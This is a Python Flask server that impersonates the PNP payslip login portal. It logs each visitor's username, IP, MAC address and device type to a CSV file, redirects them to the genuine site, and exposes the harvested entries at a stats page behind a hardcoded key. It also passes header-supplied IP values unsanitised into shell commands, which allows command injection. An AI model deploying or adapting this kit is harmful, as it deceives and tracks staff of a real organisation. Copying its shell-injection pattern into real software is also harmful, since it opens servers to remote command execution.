from flask import Flask, render_template, request, redirect #server for python 
import csv # getting the configuration of csv
import os # configuration/ portable way of using operating system
import time #getting the time
import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
import platform #used to retrieve as much possible information about the platform
import re #provides regular expression matching operations
import json #for returning JSON data

app = Flask(__name__)

# Secret access key for stats page (change this to a secure value)
STATS_ACCESS_KEY = "pnp-pms-campaign2025"

# Route for rendering the login page using html
@app.route('/')
def index():
    return render_template('index.html')

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    """
    Enhanced function to get the most accurate client IP address
    by checking multiple headers in priority order
    """
    # List of headers to check in priority order
    ip_headers = [
        'CF-Connecting-IP',           # Cloudflare
        'True-Client-IP',             # Akamai and some CDNs
        'X-Forwarded-For',            # Most common proxy header
        'X-Real-IP',                  # Nginx proxy/FastCGI
        'X-Client-IP',                # Apache proxy
        'Forwarded',                  # RFC 7239 standard
        'X-Forwarded',                # Non-standard but sometimes used
        'X-Cluster-Client-IP',        # Used by some load balancers
        'Fastly-Client-IP',           # Fastly CDN
        'X-Originating-IP'            # Microsoft 
    ]
    
    # Check each header in order
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            # X-Forwarded-For may contain multiple IPs, get the first one (client)
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                # Get the leftmost IP which is typically the original client
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    # Try WSGI environment variables if headers failed
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    # Add a unique identifier if multiple users share the same IP
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # Return IP plus a fingerprint hash to help differentiate users behind same IP
    import hashlib
    fingerprint = hashlib.md5((user_agent + request.headers.get('Accept-Language', '')).encode()).hexdigest()[:8]
    
    return f"{ip} ({fingerprint})"

"""
Function to determine if the client is using a mobile or desktop device
depending on their current device they try to log in.
"""
def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    if any(mobile in user_agent for mobile in ['iphone', 'android', 'mobile', 'tablet']):
        return 'Mobile'
    return 'Desktop'

# function to fetch their mac address of a given ip address
def get_mac_address(ip_address):
    if ip_address == '127.0.0.1':
        return 'localhost'

    """
    Handle exception function that depends on their device they currently using and 
    must be reachable depending on their os.
    """

    try:
        # ensuring the ip is reachable by sending ping
        if platform.system().lower() == "windows":
            ping_cmd = f"ping -n 1 {ip_address}"
            subprocess.call(ping_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # extract mac address using arp command
            output = subprocess.check_output(f"arp -a {ip_address}", shell=True).decode()
            mac_matches = re.findall(r"([0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2}[-][0-9A-Fa-f]{2})", output)
            if mac_matches:
                return mac_matches[0].upper()
        else:
            # For linux user/macos users
            ping_cmd = f"ping -c 1 {ip_address}"
            subprocess.call(ping_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # get the complete mac address
            output = subprocess.check_output(f"arp -n {ip_address}", shell=True).decode()
            mac_matches = re.findall(r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})", output)
            if mac_matches:
                return mac_matches[0].upper()
            
        # Alternative method for Linux
        if platform.system().lower() != "windows":
            try:
                output = subprocess.check_output(f"ip neigh show {ip_address}", shell=True).decode()
                mac_matches = re.findall(r"([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})", output)
                if mac_matches:
                    return mac_matches[0].upper() 
            except:
                pass

        return ''  
    except Exception as e:
        print(f"Error getting MAC address: {str(e)}")  
        return ''  

# routing for handle requests
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    # Note: Still receiving password from form but not using it
    
    # getting client's IP address
    ip_address = get_client_ip()
    
    # getting their mac address and device type
    mac_address = get_mac_address(ip_address)
    device_type = get_device_type()
    
    if not username:
        return render_template('index.html', error="Please enter your username")
    
    # save the credentials containing the names in every column
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    save_to_csv(username, timestamp, ip_address, mac_address, device_type)
    
    # looping from copycat-ed ui/ux of pnp payslip to it's original payslip
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2F")

def save_to_csv(username, timestamp, ip_address, mac_address, device_type):
    """ 
    Get the directory where the script is located. The name for stacking credentials is 
    data.csv
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            """
            if file does not exist or is empty, it will write header
            """
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow(['username', 'timestamp', 'ip_address', 'mac_address', 'device_type'])
                csvfile.flush()

            # append login credentials (without password)
            writer.writerow([username, timestamp, ip_address, mac_address, device_type])
            csvfile.flush()
    except PermissionError:
        
        """
        if writing to default location fails, it will go alternative way/append
        to navigate it's location request.
        """
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        with open(fallback_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
            
            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                writer.writerow(['username', 'timestamp', 'ip_address', 'mac_address', 'device_type'])
                csvfile.flush()
            
            writer.writerow([username, timestamp, ip_address, mac_address, device_type])
            csvfile.flush()

# Add a route to view statistics with access key protection
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    data = list(reader)
                break  # Successfully read data, exit loop
            except Exception as e:
                continue
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data)

if __name__ == '__main__':
    #run server 
    app.run(
        host='0.0.0.0',  
        port=5000,       # You can change this port if needed. do not remove for handling port.
        debug=False      # set to False for production. do not remove this.
    ) 